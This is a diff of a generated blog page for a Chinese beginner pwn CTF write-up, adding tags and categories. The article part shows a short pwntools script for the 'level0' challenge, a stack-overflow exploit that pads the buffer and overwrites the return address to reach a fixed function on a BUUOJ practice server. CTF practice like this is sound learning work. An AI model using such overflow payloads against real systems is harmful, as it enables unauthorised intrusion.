@@ -368,12 +368,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/pwn-ctf/">
+                                <span class="chip bg-color">pwn-ctf</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/pwn/" class="post-category">
+                                pwn
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -416,9 +429,10 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="level0"><a href="#level0" class="headerlink" title="level0:"></a>level0:</h3><span id="more"></span>
+                <p>pwn入门 level题目</p>
+<span id="more"></span>
 
-<p>栈溢出</p>
+<h3 id="level0"><a href="#level0" class="headerlink" title="level0:"></a>level0:</h3><p>栈溢出</p>
 <pre class="line-numbers language-none"><code class="language-none">from pwn import *
 r=remote('node4.buuoj.cn', xxxxx)
 payload = b'a' * (0x80 + 8) + p64(0x0000000000400596)
@@ -545,7 +559,11 @@ r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/pwn-ctf/">
+                                    <span class="chip bg-color">pwn-ctf</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -649,11 +667,23 @@ r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            marginal
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/reverse/" class="post-category">
+                                    reverse
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/re-android/">
+                        <span class="chip bg-color">re-android</span>
+                    </a>
+                    
                 </div>
                 
             </div>
